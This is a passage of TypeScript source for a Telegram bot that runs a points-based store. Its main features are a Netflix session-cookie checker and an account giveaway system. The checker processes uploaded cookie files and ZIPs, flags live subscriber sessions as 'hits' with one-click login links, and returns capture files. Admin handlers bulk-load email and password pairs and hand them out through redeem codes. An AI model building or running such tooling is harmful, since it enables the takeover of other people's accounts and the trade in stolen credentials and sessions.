          bot.sendMessage(msg.chat.id, "🚫 <b>Anti-Spam:</b> You have been temporarily muted for 1 minute.", { parse_mode: "HTML" }).catch(() => {});
          tempBans.set(userId, Date.now() + 60000);
          spamWarnings.set(userId, 0);
        }
        return;
      } else {
        if (Date.now() - lastMsgTime > 5000) spamWarnings.set(userId, 0);
      }
      rateLimit.set(userId, Date.now());
    }

    try {
      const chatId = msg.chat.id;
      const tgUserId = msg.from!.id;
      const tgUsername = msg.from!.username || msg.from!.first_name || `user_${tgUserId}`;
      const text = msg.text || "";

      if (msg.photo) {
        const photoId = msg.photo[msg.photo.length - 1].file_id;
        if (waitingScreenshot[tgUserId]) {
          const info = waitingScreenshot[tgUserId];
          delete waitingScreenshot[tgUserId];
          await bot.sendMessage(chatId, `✅ Screenshot received for ${info.itemName}! Thank you.`, { parse_mode: "HTML" });
          const stars = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣"];
          await bot.sendMessage(chatId,
            `⭐ <b>Rate This Account</b>\n${"─".repeat(30)}\n\nHow would you rate <b>${esc(info.itemName)}</b>?\n\nTap a star below:`,
            {
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  stars.map((s, i) => ({ text: s, callback_data: `acct_rate:${i + 1}:${info.itemName}:${info.source || "store"}` })),
                  [{ text: "❌ Skip", callback_data: "acct_rate:skip" }],
                ],
              },
            }
          );
          if (info.source === "animatrix") {
            if (OWNER_ID) {
              try {
                await bot.sendPhoto(OWNER_ID, photoId, {
                  caption: `📸 <b>Animatrix Screenshot</b>\n👤 @${esc(info.username)}\n🎁 ${esc(info.itemName)}\n📅 ${new Date().toLocaleString()}`,
                  parse_mode: "HTML",
                });
              } catch {}
            }
          } else {
            if (SCREENSHOT_CHANNEL) {
              try {
                await bot.sendPhoto(SCREENSHOT_CHANNEL, photoId, {
                  caption: `📸 <b>Purchase Proof</b>\n👤 @${esc(info.username)}\n🎁 Item: ${esc(info.itemName)}\n📅 ${new Date().toLocaleString()}`,
                  parse_mode: "HTML",
                });
                console.log(`✅ Purchase screenshot forwarded to proofs channel`);
              } catch (err: any) {
                console.error(`❌ Failed to send screenshot to channel ${SCREENSHOT_CHANNEL}:`, err.message);
                if (OWNER_ID) {
                  try { await bot.sendMessage(OWNER_ID, `⚠️ Failed to send screenshot to proofs channel: ${err.message}`); } catch {}
                }
              }
            }
            if (OWNER_ID) {
              try {
                await bot.sendPhoto(OWNER_ID, photoId, {
                  caption: `📸 <b>Purchase Screenshot</b>\n👤 @${esc(info.username)}\n🎁 Item: ${esc(info.itemName)}`,
                  parse_mode: "HTML",
                });
              } catch {}
            }
          }
        } else {
          if (OWNER_ID) {
            try {
              await bot.sendPhoto(OWNER_ID, photoId, {
                caption: `📸 Photo from @${esc(tgUsername)} (${tgUserId})`,
                parse_mode: "HTML",
              });
            } catch {}
          }
        }
        return;
      }

      if (msg.document && pending[Number(tgUserId)]?.action === "nf_check") {
        const doc = msg.document;
        const fname = (doc.file_name || "").toLowerCase();
          try {
            const fileLink = await bot.getFileLink(doc.file_id);
            const fileRes = await fetch(fileLink);
            let fileText = "";
            if (fname.endsWith(".zip")) {
              const arrayBuf = await fileRes.arrayBuffer();
              const zip = new AdmZip(Buffer.from(arrayBuf));
              const entries = zip.getEntries();
              const allFiles = entries.filter(e => !e.isDirectory);
              for (const entry of allFiles) {
                const content = entry.getData().toString("utf8");
                if (content.length > 10) fileText += content + "\n";
              }
              await bot.sendMessage(chatId, `📦 ZIP: extracted ${allFiles.length} file(s)`, { parse_mode: "HTML" });
            } else {
              fileText = await fileRes.text();
            }
            let cookies = parseCookiesFromText(fileText);
            if (cookies.length === 0) {
              return bot.sendMessage(chatId, "❌ No valid cookies found in file.", { parse_mode: "HTML" });
            }
            const unlim = await isAdminOrOwner(tgUserId) || isVipChecker(tgUserId);
            if (!unlim && cookies.length > MAX_COOKIES_NORMAL) {
              cookies = cookies.slice(0, MAX_COOKIES_NORMAL);
              await bot.sendMessage(chatId, `⚠️ You can check up to <b>${MAX_COOKIES_NORMAL}</b> cookies. Only the first ${MAX_COOKIES_NORMAL} will be checked.\n\n💎 Contact admin for unlimited access.`, { parse_mode: "HTML" });
            }
            delete pending[Number(tgUserId)];
            nfCheckStopped.delete(tgUserId);
            const stopKb = { reply_markup: { inline_keyboard: [[{ text: "⏹ Stop", callback_data: "nf_stop" }]] } };
            const statusMsg = await bot.sendMessage(chatId,
              `🔍 <b>NF Token — Checking...</b>\n\n📄 File: ${esc(doc.file_name)}\n⏳ Checking <b>${cookies.length}</b> cookie(s)...\n\n${"░".repeat(20)} 0%`,
              { parse_mode: "HTML", ...stopKb }
            );
            const hits: NFCheckResult[] = [];
            const holdHits: NFCheckResult[] = [];
            const dead: string[] = [];
            let checked = 0;
            let stopped = false;
            for (const cookie of cookies) {
              if (nfCheckStopped.has(tgUserId)) { stopped = true; nfCheckStopped.delete(tgUserId); break; }
              const result = await checkNetflixCookie(cookie);
              checked++;
              const pct = Math.round((checked / cookies.length) * 100);
              const filled = Math.round(pct / 5);
              const bar = "█".repeat(filled) + "░".repeat(20 - filled);
              if (result.success) {
                if (result.membershipStatus === "CURRENT_MEMBER") {
                  hits.push(result);
                  await bot.sendMessage(chatId, formatNFHitMessage(result, hits.length), {
                    parse_mode: "HTML",
                    disable_web_page_preview: true,
                    reply_markup: {
                      inline_keyboard: [[{ text: "🔓 Login to Account", url: result.loginUrl! }]],
                    },
                  });
                } else {
                  holdHits.push(result);
                }
              } else {
                dead.push(cookie.substring(0, 20) + "...");
              }
              if (checked % 5 === 0 || checked === cookies.length) {
                try {
                  await bot.editMessageText(
                    `🔍 <b>NF Token — Checking...</b>\n\n[${bar}] ${pct}%\n🎯 ${checked}/${cookies.length}\n✅ ${hits.length} | ⏸ ${holdHits.length} | ❌ ${dead.length}`,
                    { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML", ...stopKb }
                  );
                } catch {}
              }
            }
            const statusLabel = stopped ? "Stopped" : "Complete";
            const statusEmoji = stopped ? "⏹" : "🔍";
            try {
              await bot.editMessageText(
                `${statusEmoji} <b>NF Token — ${statusLabel}!</b>\n\n${"█".repeat(20)} ${stopped ? Math.round((checked / cookies.length) * 100) : 100}%\n🎯 ${checked}/${cookies.length}\n✅ ${hits.length} | ⏸ ${holdHits.length} | ❌ ${dead.length}\n\n🔥 <b>Premium Hits: ${hits.length}</b> | ⏸ <b>Hold: ${holdHits.length}</b>`,
                { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
              );
            } catch {}
            if (hits.length > 0) {
              const captureBuffer = generateCaptureFile(hits);
              await bot.sendDocument(chatId, captureBuffer, {
                caption: `✅ Active Accounts — ${hits.length} Hit(s)\nby @INTANETO7701`,
              }, { filename: `by @INTANETO7701.txt`, contentType: "text/plain" });
            }
            if (holdHits.length > 0) {
              const holdBuffer = generateCaptureFile(holdHits);
              await bot.sendDocument(chatId, holdBuffer, {
                caption: `⏸ Hold Cookies — ${holdHits.length} account(s)\nby @INTANETO7701`,
              }, { filename: `hold cookies by @INTANETO7701.txt`, contentType: "text/plain" });
            }
            if (hits.length === 0 && holdHits.length === 0) {
              await bot.sendMessage(chatId, "😢 No working cookies found.");
            }
            return;
          } catch (err: any) {
            return bot.sendMessage(chatId, `❌ Error reading file: ${err.message}`, { parse_mode: "HTML" });
          }
      }

      if (text === "/done" && pending[Number(tgUserId)]?.action === "add_stock") {
      } else if (text.startsWith("/")) return;

      if (CHANNELS.length > 0 && !await checkAllChannels(tgUserId)) {
        const { text: t, opts } = await joinChannelsMsgForUser(tgUserId);
        return bot.sendMessage(chatId, t, opts);
      }

      const user = await storage.getUserByTelegramId(String(tgUserId)) ||
        await storage.getUserByUsername(tgUsername);

      if (!user) return bot.sendMessage(chatId, "Please use /start first.");

      // FIX: Check temp ban and auto-unban
      const isTempBanned = await storage.isTempBanned(user.id);
      if (user.isBanned && !isTempBanned && !user.tempBanUntil) {
        return bot.sendMessage(chatId, `⛔ You are banned.\nReason: ${user.bannedReason || "No reason given."}`);
      }
      if (isTempBanned) {
        return bot.sendMessage(chatId, `⛔ You are temporarily banned.\nPlease wait until the ban expires.`);
      }
      // If temp ban expired, isTempBanned already cleared it - re-fetch
      const freshUser = await storage.getUserByTelegramId(String(tgUserId));
      if (freshUser && freshUser.isBanned) {
        return bot.sendMessage(chatId, `⛔ You are banned.\nReason: ${freshUser.bannedReason || "No reason given."}`);
      }

      const isAdmin = await isAdminOrOwner(tgUserId);

      if (pending[Number(tgUserId)]) {
        const state = pending[Number(tgUserId)];

        if (text === "🔙 Cancel") {
          delete pending[Number(tgUserId)];
          return bot.sendMessage(chatId, "❌ Action canceled.", userMenu(isAdmin));
        }

        if (state.action === "support_ticket") {
          const ticket = await storage.createTicket(String(tgUserId), tgUsername, text);
          delete pending[Number(tgUserId)];
          const adminMsg = `🎫 <b>New Support Ticket</b>\n\n👤 User: @${esc(tgUsername)} (${tgUserId})\n💬 Message:\n${esc(text)}`;
          const inlineReply = { inline_keyboard: [[{ text: "📝 Reply to Ticket", callback_data: `reply_ticket:${ticket.id}` }]] };
          if (OWNER_ID) {
            try { await bot.sendMessage(OWNER_ID, adminMsg, { parse_mode: "HTML", reply_markup: inlineReply }); } catch {}
          }
          const admins = await storage.getAdmins();
          for (const a of admins) {
            if (a !== OWNER_ID) {
              try { await bot.sendMessage(a, adminMsg, { parse_mode: "HTML", reply_markup: inlineReply }); } catch {}
            }
          }
          return bot.sendMessage(chatId, "✅ Your ticket has been submitted successfully. We will reply to you as soon as possible.", userMenu(isAdmin));
        }

        if (state.action === "reply_ticket") {
          const ticketId = state.data.ticketId;
          const ticket = await storage.getTicket(ticketId);
          delete pending[Number(tgUserId)];
          if (ticket) {
            await storage.closeTicket(ticketId, text);
            try {
              await bot.sendMessage(ticket.userId,
                `📩 <b>Reply from Support Team</b>\n${"─".repeat(28)}\n\n${esc(text)}\n\n<i>Ticket #${esc(ticketId)}</i>`,
                { parse_mode: "HTML" }
              );
              await bot.sendMessage(chatId, `✅ Reply sent successfully to @${esc(ticket.username)}.`, adminMenu());
            } catch {
              await bot.sendMessage(chatId, "❌ Could not send reply to the user (they may have blocked the bot).", adminMenu());
            }
          } else {
            await bot.sendMessage(chatId, "❌ Ticket not found.", adminMenu());
          }
          return;
        }

        if (state.action === "rating_feedback") {
          delete pending[Number(tgUserId)];
          const ratingData = ratingPending[tgUserId];
          if (!ratingData) return;
          delete ratingPending[tgUserId];
          const feedback = text === "/skip" ? "No feedback provided" : text;
          const ratingStars = "⭐".repeat(ratingData.rating);
          const ratingMsg =
            `⭐ New Rating Received!\n${"─".repeat(30)}\n\n👤 User: @${esc(user.username)}\n🆔 ID: ${tgUserId}\n⭐ Rating: ${ratingStars} (${ratingData.rating}/5)\n💬 Feedback: ${feedback}\n📅 ${new Date().toLocaleString()}`;
          if (OWNER_ID) { try { await bot.sendMessage(OWNER_ID, ratingMsg, { parse_mode: "HTML" }); } catch {} }
          await bot.sendMessage(chatId, `✅ Thank you for your feedback!`, { parse_mode: "HTML" });
          return;
        }

        if (state.action === "giveaway_setup") {
          delete pending[Number(tgUserId)];
          const parts = text.trim().split(/\s+/);
          const duration = parseInt(parts[0]);
          const requiredRefs = parseInt(parts[1] || "0");
          if (isNaN(duration) || duration <= 0) return bot.sendMessage(chatId, "❌ Invalid duration. Send a number in minutes.", { parse_mode: "HTML" });
          if (isNaN(requiredRefs) || requiredRefs < 0) return bot.sendMessage(chatId, "❌ Invalid referral count.", { parse_mode: "HTML" });

          const durationMs = duration * 60 * 1000;
          giveaway.active = true;
          giveaway.endTime = Date.now() + durationMs;
          giveaway.requiredReferrals = requiredRefs;
          giveaway.participants = [];
          giveaway.timer = setTimeout(() => endGiveaway(), durationMs);

          const timeStr = formatTimeLeft(durationMs);
          await bot.sendMessage(chatId,
            `✅ <b>Giveaway started!</b>\n\n🏆 Prize: 1 point\n⏳ Duration: ${timeStr}\n📨 Required Referrals: ${requiredRefs}\n\nBroadcasting to all users...`,
            { parse_mode: "HTML", ...adminMenu() }
          );

          const allUsers = await storage.getAllUsers();
          let sent = 0;
          for (const u of allUsers) {
            if (u.isBanned || !u.chatId || String(u.telegramId) === String(tgUserId)) continue;
            try {
              await bot.sendMessage(Number(u.chatId),
                `🎁 <b>GIVEAWAY IS ACTIVE!</b>\n${"─".repeat(30)}\n\n🏆 Prize: 1 point\n⏳ Ends in: ${timeStr}\n${requiredRefs > 0 ? `📨 You need ${requiredRefs} referrals to join!\n` : ""}\nTap below to join now!`,
                {
                  parse_mode: "HTML",
                  reply_markup: {
                    inline_keyboard: [[{ text: "🎁 Join Giveaway", callback_data: "giveaway_join" }]],
                  },
                }
              );
              sent++;
            } catch {}
          }
          await bot.sendMessage(chatId, `✅ Giveaway broadcast sent to ${sent} users!`, adminMenu());
          return;
        }

        if (state.action === "ch_add") {
          delete pending[Number(tgUserId)];
          const channel = text.trim();
          if (!channel) return bot.sendMessage(chatId, "❌ Invalid channel. Try again.");
          CHANNELS.push(channel);
          saveChannels();
          return bot.sendMessage(chatId,
            `✅ Channel added: <code>${esc(channel)}</code>\n\nTotal channels: ${CHANNELS.length}`,
            { parse_mode: "HTML", disable_web_page_preview: true }
          );
        }

        if (state.action === "broadcast") {
          pending[Number(tgUserId)] = { action: "broadcast_confirm", data: { message: text } };
          const totalUsers = await storage.getTotalUsers();
          return bot.sendMessage(chatId,
            `📢 Broadcast Preview:\n${"─".repeat(30)}\n\n${esc(text)}\n\n${"─".repeat(30)}\n👥 Will be sent to ${totalUsers} users.\n\n⚠️ Are you sure?`,
            { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "✅ Yes, Send", callback_data: "broadcast_yes" }, { text: "❌ Cancel", callback_data: "broadcast_no" }]] } }
          );
        }

        if (state.action === "broadcast_confirm") { delete pending[Number(tgUserId)]; return; }

        if (state.action === "ax_bulk_label") {
          const label = text.trim();
          if (!label) return bot.sendMessage(chatId, "❌ Label cannot be empty. Try again:", { parse_mode: "HTML" });
          pending[Number(tgUserId)] = { action: "ax_bulk_accounts", ax_label: label };
          return bot.sendMessage(chatId,
            `📦 <b>Bulk Add — ${esc(label)}</b>\n${"─".repeat(30)}\n\n` +
            `📝 <b>Step 2/2</b> — Send accounts, one per line:\n\n` +
            `<b>Format:</b>\n` +
            `<code>email password</code> or <code>email | password</code>\n\n` +
            `<b>Example:</b>\n` +
            `<code>user1@mail.com pass123\nuser2@mail.com pass456\nuser3@mail.com mypass</code>\n\n` +
            `💡 Without password:\n<code>user@mail.com</code>\n\n` +
            `Send your list or /cancel:`,
            { parse_mode: "HTML" }
          );
          return;
        }

        if (state.action === "ax_bulk_accounts") {
          const label = state.ax_label;
          delete pending[Number(tgUserId)];
          const lines = text.split("\n").map((l: string) => l.trim()).filter((l: string) => l.length > 0);
          if (lines.length === 0) return bot.sendMessage(chatId, "❌ No accounts found.", { parse_mode: "HTML" });

          const added: { email: string; password: string; code: string }[] = [];
          for (const line of lines) {
            let email = "", password = "";
            if (line.includes("|")) {
              const parts = line.split("|").map((p: string) => p.trim());
              email = parts[0] || "";
              password = parts[1] || "";
            } else if (line.includes(":")) {
              const parts = line.split(":").map((p: string) => p.trim());
              email = parts[0] || "";
              password = parts.slice(1).join(":") || "";
            } else {
              const parts = line.split(/\s+/);
              email = parts[0] || "";
              password = parts.slice(1).join(" ") || "";
            }
            if (!email) continue;
            const codePrefix = label.toUpperCase().replace(/[^A-Z0-9]/g, "").substring(0, 7) || "NETFLIX";
            const codeParts = [
              crypto.randomBytes(2).toString("hex").toUpperCase().substring(0, 4),
              crypto.randomBytes(2).toString("hex").toUpperCase().substring(0, 4),
              crypto.randomBytes(2).toString("hex").toUpperCase().substring(0, 4),
            ];
            const redeemCode = `${codePrefix}-${codeParts[0]}-${codeParts[1]}-${codeParts[2]}`;
            await storage.createAnimatrixCode({ code: redeemCode, email, password, label });
            added.push({ email, password, code: redeemCode });
          }

          if (added.length === 0) return bot.sendMessage(chatId, "❌ No valid accounts found.", { parse_mode: "HTML" });

          let summary = `✅ <b>${added.length} Account(s) Added!</b>\n`;
          summary += `${"═".repeat(30)}\n`;
          summary += `🏷 <b>Label:</b> ${esc(label)}\n\n`;
          for (let i = 0; i < added.length; i++) {
            const a = added[i];
            summary += `<b>${i + 1}.</b> <code>${esc(a.email)}</code>`;
            if (a.password) summary += ` | <code>${esc(a.password)}</code>`;
            summary += `\n🎫 <code>${esc(a.code)}</code>\n\n`;
          }

          if (summary.length > 4000) {
            const fileContent = added.map((a, i) => `${i + 1}. ${a.email} | ${a.password || "—"} | Code: ${a.code}`).join("\n");
            const buf = Buffer.from(fileContent, "utf-8");
            await bot.sendDocument(chatId, buf, {
              caption: `✅ ${added.length} accounts added under "${label}"`,
            }, { filename: `animatrix_${added.length}_accounts.txt`, contentType: "text/plain" });
          } else {
            await bot.sendMessage(chatId, summary, { parse_mode: "HTML" });
          }

          const codesList = added.map(a => a.code).join("\n");
          const giveawayMsg =
            `🖤 <b>${esc(label)} Accounts Giveaway</b> 🎉\n\n` +
            `✅ <b>Generated ${added.length} codes:</b>\n\n` +
            `<code>${esc(codesList)}</code>\n\n` +
            `💀 <b>Use this format when sending the code to the bot:</b>\n` +
            `<code>/animatrix CODE</code>\n\n` +
            `Redeem From This Bot 👉 @${BOT_USERNAME}\n\n` +
            `Give Reaction And Keep Supporting Us 😀\n\n` +
            `Send ScreenShot For More 👉 @INTANETO7701\n\n` +
            `🔸 Check Bio For More Details 🔸`;

          await bot.sendMessage(chatId, `📢 <b>Giveaway Post Ready!</b>\nCopy and forward this to your channels 👇`, { parse_mode: "HTML" });
          await bot.sendMessage(chatId, giveawayMsg, { parse_mode: "HTML", disable_web_page_preview: true });
          return;
        }

        if (state.action === "ax_bulk_direct") {
          delete pending[Number(tgUserId)];
          const lines = text.split("\n").map((l: string) => l.trim()).filter((l: string) => l.length > 0);
          if (lines.length === 0) return bot.sendMessage(chatId, "❌ No accounts found.", { parse_mode: "HTML" });

          const added: { label: string; email: string; password: string; code: string }[] = [];
          for (const line of lines) {
            let label = "", email = "", password = "";
            if (line.includes("|")) {
              const parts = line.split("|").map((p: string) => p.trim());
              label = parts[0] || "Account";
              email = parts[1] || "";
              password = parts[2] || "";
            } else {
              const parts = line.split(/\s+/);
              label = parts[0] || "Account";
              email = parts[1] || "";
              password = parts.slice(2).join(" ") || "";
            }
            if (!email) continue;
            const codePrefix = label.toUpperCase().replace(/[^A-Z0-9]/g, "").substring(0, 7) || "NETFLIX";
            const codeParts = [
              crypto.randomBytes(2).toString("hex").toUpperCase().substring(0, 4),
              crypto.randomBytes(2).toString("hex").toUpperCase().substring(0, 4),
              crypto.randomBytes(2).toString("hex").toUpperCase().substring(0, 4),
            ];
            const redeemCode = `${codePrefix}-${codeParts[0]}-${codeParts[1]}-${codeParts[2]}`;
            await storage.createAnimatrixCode({ code: redeemCode, email, password, label });
            added.push({ label, email, password, code: redeemCode });
          }

          if (added.length === 0) return bot.sendMessage(chatId, "❌ No valid accounts found.", { parse_mode: "HTML" });

          let summary = `✅ <b>${added.length} Account(s) Added!</b>\n`;
          summary += `${"═".repeat(30)}\n\n`;
          for (let i = 0; i < added.length; i++) {
            const a = added[i];
            summary += `<b>${i + 1}.</b> 🏷 ${esc(a.label)} | <code>${esc(a.email)}</code>`;
            if (a.password) summary += ` | <code>${esc(a.password)}</code>`;
            summary += `\n🎫 <code>${esc(a.code)}</code>\n\n`;
          }

          if (summary.length > 4000) {
            const fileContent = added.map((a, i) => `${i + 1}. [${a.label}] ${a.email} | ${a.password || "—"} | Code: ${a.code}`).join("\n");
            const buf = Buffer.from(fileContent, "utf-8");
            await bot.sendDocument(chatId, buf, {
              caption: `✅ ${added.length} accounts added`,
            }, { filename: `animatrix_${added.length}_accounts.txt`, contentType: "text/plain" });
          } else {
            await bot.sendMessage(chatId, summary, { parse_mode: "HTML" });
          }

          const groupedLabels = [...new Set(added.map(a => a.label))];
          const mainLabel = groupedLabels[0] || "Accounts";
          const codesList2 = added.map(a => a.code).join("\n");
          const giveawayMsg2 =
            `🖤 <b>${esc(mainLabel)} Accounts Giveaway</b> 🎉\n\n` +
            `✅ <b>Generated ${added.length} codes:</b>\n\n` +
            `<code>${esc(codesList2)}</code>\n\n` +
            `💀 <b>Use this format when sending the code to the bot:</b>\n` +
            `<code>/animatrix CODE</code>\n\n` +
            `Redeem From This Bot 👉 @${BOT_USERNAME}\n\n` +
            `Give Reaction And Keep Supporting Us 😀\n\n` +
            `Send ScreenShot For More 👉 @INTANETO7701\n\n` +
            `🔸 Check Bio For More Details 🔸`;

          await bot.sendMessage(chatId, `📢 <b>Giveaway Post Ready!</b>\nCopy and forward this to your channels 👇`, { parse_mode: "HTML" });
          await bot.sendMessage(chatId, giveawayMsg2, { parse_mode: "HTML", disable_web_page_preview: true });
          return;
        }

        if (state.action === "ax_single_label") {
          const label = text.trim();
          if (!label) return bot.sendMessage(chatId, "❌ Send a valid label.", { parse_mode: "HTML" });
          pending[Number(tgUserId)] = { action: "ax_add_quick", ax_label: label };
          return bot.sendMessage(chatId,
            `🏷 <b>Label:</b> <code>${esc(label)}</code>\n\n` +
            `📝 Now send the account:\n\n` +
            `<code>email password</code>\n` +
            `or <code>email | password</code>\n\n` +
            `<b>Example:</b>\n` +
            `<code>user@mail.com pass123</code>\n\n` +
            `Send it or /cancel:`,
            { parse_mode: "HTML" }
          );
        }

        if (state.action === "ax_add_quick") {
          delete pending[Number(tgUserId)];
          let email = "", password = "";
          const input = text.trim();
          if (input.includes("|")) {
            const parts = input.split("|").map((p: string) => p.trim());
            email = parts[0] || "";
            password = parts[1] || "";
          } else if (input.includes(":")) {
            const parts = input.split(":");
            email = parts[0]?.trim() || "";
            password = parts.slice(1).join(":").trim() || "";
          } else {
            const parts = input.split(/\s+/);
            email = parts[0] || "";
            password = parts.slice(1).join(" ") || "";
          }
          if (!email) return bot.sendMessage(chatId, "❌ No email found. Try again.", { parse_mode: "HTML" });

          const label = state.ax_label || "Account";
          const redeemCode = crypto.randomBytes(4).toString("hex").toUpperCase();
          await storage.createAnimatrixCode({ code: redeemCode, email, password, label });

          await bot.sendMessage(chatId,
            `✅ <b>Account Added!</b>\n` +
            `${"─".repeat(30)}\n\n` +
            `🏷 <b>Label:</b> ${esc(label)}\n` +
            `🔑 <b>Account:</b> <code>${esc(email)}</code>\n` +
            (password ? `🔐 <b>Password:</b> <code>${esc(password)}</code>\n` : "") +
            `🎫 <b>Redeem Code:</b> <code>${esc(redeemCode)}</code>\n\n` +
            `💡 Users redeem with: <code>/animatrix ${esc(redeemCode)}</code>`,
            { parse_mode: "HTML" }
          );
          return;
        }

        if (state.action === "nf_check") {
          delete pending[Number(tgUserId)];
          let cookies = parseCookiesFromText(text);
          if (cookies.length === 0) {
            return bot.sendMessage(chatId, "❌ No valid cookies found. Send one cookie per line.", { parse_mode: "HTML" });
          }
          const unlim = isAdmin || isVipChecker(tgUserId);
          if (!unlim && cookies.length > MAX_COOKIES_NORMAL) {
            cookies = cookies.slice(0, MAX_COOKIES_NORMAL);
            await bot.sendMessage(chatId, `⚠️ You can check up to <b>${MAX_COOKIES_NORMAL}</b> cookies. Only the first ${MAX_COOKIES_NORMAL} will be checked.\n\n💎 Contact admin for unlimited access.`, { parse_mode: "HTML" });
          }
          nfCheckStopped.delete(tgUserId);
          const stopKb2 = { reply_markup: { inline_keyboard: [[{ text: "⏹ Stop", callback_data: "nf_stop" }]] } };
          const statusMsg = await bot.sendMessage(chatId,
            `🔍 <b>NF Token — Checking...</b>\n\n⏳ Checking <b>${cookies.length}</b> cookie(s)...\n\n${"░".repeat(20)} 0%`,
            { parse_mode: "HTML", ...stopKb2 }
          );
          const hits: NFCheckResult[] = [];
          const holdHits: NFCheckResult[] = [];
          const dead: string[] = [];
          let checked = 0;
          let stopped = false;
          for (const cookie of cookies) {
            if (nfCheckStopped.has(tgUserId)) { stopped = true; nfCheckStopped.delete(tgUserId); break; }
            const result = await checkNetflixCookie(cookie);
            checked++;
            const pct = Math.round((checked / cookies.length) * 100);
            const filled = Math.round(pct / 5);
            const bar = "█".repeat(filled) + "░".repeat(20 - filled);
            if (result.success) {
              if (result.membershipStatus === "CURRENT_MEMBER") {
                hits.push(result);
                await bot.sendMessage(chatId, formatNFHitMessage(result, hits.length), {
                  parse_mode: "HTML",
                  disable_web_page_preview: true,
                  reply_markup: {
                    inline_keyboard: [[{ text: "🔓 Login to Account", url: result.loginUrl! }]],
                  },
                });
              } else {
                holdHits.push(result);
              }
            } else {
              dead.push(cookie.substring(0, 20) + "...");
            }
            if (checked % 3 === 0 || checked === cookies.length) {
              try {
                await bot.editMessageText(
                  `🔍 <b>NF Token — Checking...</b>\n\n[${bar}] ${pct}%\n🎯 ${checked}/${cookies.length}\n✅ ${hits.length} | ⏸ ${holdHits.length} | ❌ ${dead.length}`,
                  { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML", ...stopKb2 }
                );
              } catch {}
            }
          }
          const statusLabel2 = stopped ? "Stopped" : "Complete";
          const statusEmoji2 = stopped ? "⏹" : "🔍";
          try {
            await bot.editMessageText(
              `${statusEmoji2} <b>NF Token — ${statusLabel2}!</b>\n\n${"█".repeat(20)} ${stopped ? Math.round((checked / cookies.length) * 100) : 100}%\n🎯 ${checked}/${cookies.length}\n✅ ${hits.length} | ⏸ ${holdHits.length} | ❌ ${dead.length}\n\n🔥 <b>Premium Hits: ${hits.length}</b> | ⏸ <b>Hold: ${holdHits.length}</b>`,
              { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
            );
          } catch {}
          if (hits.length > 0) {
            const captureBuffer = generateCaptureFile(hits);
            await bot.sendDocument(chatId, captureBuffer, {
              caption: `✅ Active Accounts — ${hits.length} Hit(s)\nby @INTANETO7701`,
            }, { filename: `by @INTANETO7701.txt`, contentType: "text/plain" });
          }
          if (holdHits.length > 0) {
            const holdBuffer = generateCaptureFile(holdHits);
            await bot.sendDocument(chatId, holdBuffer, {
              caption: `⏸ Hold Cookies — ${holdHits.length} account(s)\nby @INTANETO7701`,
            }, { filename: `hold cookies by @INTANETO7701.txt`, contentType: "text/plain" });
          }
          if (hits.length === 0 && holdHits.length === 0) {
            await bot.sendMessage(chatId, "😢 No working cookies found.");
          }
          return;
        }

        if (state.action === "redeem_waiting") {
          delete pending[Number(tgUserId)];
          const code = text.trim();
          if (!code) return bot.sendMessage(chatId, "❌ Please send a valid code.");
          const rc = await storage.getRedeemCode(code);
          if (!rc) return bot.sendMessage(chatId, "❌ Invalid code. Please check and try again.", userMenu(isAdmin));
          if (rc.currentUses >= rc.maxUses) return bot.sendMessage(chatId, "❌ This code has already been fully redeemed.", userMenu(isAdmin));
          const alreadyUsed = await storage.hasUsedRedeemCode(rc.id, user.id);
          if (alreadyUsed) return bot.sendMessage(chatId, "❌ You have already used this code.", userMenu(isAdmin));
          await storage.useRedeemCode(rc.id, user.id);
          await storage.addPoints(user.id, rc.points);
          await bot.sendMessage(chatId,
            `🎉 Code Redeemed Successfully!\n${"─".repeat(30)}\n\n🎟️ Code: ${esc(rc.code)}\n💰 Points received: +${rc.points}\n💳 New balance: ${user.points + rc.points}`,
            userMenu(isAdmin)
          );
          await notifyOwner(`🎟️ Code Redeemed!\n\n👤 User: @${esc(user.username)}\n🎟️ Code: ${esc(rc.code)}\n💰 Points: +${rc.points}\n📊 Code uses: ${rc.currentUses + 1}/${rc.maxUses}`);
          return;
        }

        if (state.action === "transfer_waiting") {
          delete pending[Number(tgUserId)];
          const parts = text.trim().split(/\s+/);
          if (parts.length < 2) return bot.sendMessage(chatId, "❌ Format: @username amount", userMenu(isAdmin));
          let targetUsername = parts[0].replace("@", "");
          const amount = parseInt(parts[1]);
          if (!amount || amount < 10) return bot.sendMessage(chatId, "❌ Minimum transfer is 10 points.", userMenu(isAdmin));
          if (amount > (user.points || 0)) return bot.sendMessage(chatId, `❌ Insufficient points! You have ${user.points} points.`, userMenu(isAdmin));
          const target = await storage.getUserByUsername(targetUsername);
          if (!target) return bot.sendMessage(chatId, "❌ User not found.", userMenu(isAdmin));
          if (target.id === user.id) return bot.sendMessage(chatId, "❌ You can't transfer to yourself.", userMenu(isAdmin));
          const fee = Math.ceil(amount * 0.10);
          const received = amount - fee;
          await storage.deductPoints(user.id, amount);
          await storage.addPoints(target.id, received);
          addLog("transfer", user.username, String(tgUserId), `Sent ${amount} pts to @${targetUsername} (fee: ${fee}, received: ${received})`);
          await bot.sendMessage(chatId,
            `💸 Transfer Successful!\n${"─".repeat(30)}\n\n📤 Sent: ${amount} points\n💳 Fee (10%): -${fee} points\n📥 Received by @${esc(targetUsername)}: ${received} points\n💰 Your new balance: ${(user.points || 0) - amount}`,
            userMenu(isAdmin)
          );
          if (target.chatId) {
            try { await bot.sendMessage(Number(target.chatId), `💸 You received ${received} points from @${esc(user.username)}!`); } catch {}
          }
          return;
        }

        if (state.action === "ax_delete_code") {
          delete pending[Number(tgUserId)];
          const code = text.trim().toUpperCase();
          const existing = await storage.getAnimatrixCode(code);
          if (!existing) return bot.sendMessage(chatId, `❌ Code <code>${esc(code)}</code> not found.`, { parse_mode: "HTML" });
          await storage.deleteAnimatrixCode(code);
          return bot.sendMessage(chatId, `🗑 Code <code>${esc(code)}</code> deleted successfully!`, { parse_mode: "HTML" });
        }

        if (state.action === "warn_user") {
          delete pending[Number(tgUserId)];
          const targetUsername = text.trim().replace("@", "");
          const target = await storage.getUserByUsername(targetUsername);
          if (!target) return bot.sendMessage(chatId, "❌ User not found.", adminMenu());
          const warnings = await storage.warnUser(target.id);
          if (warnings >= 3) {
            await storage.banUser(target.id, "Exceeded 3 warnings");
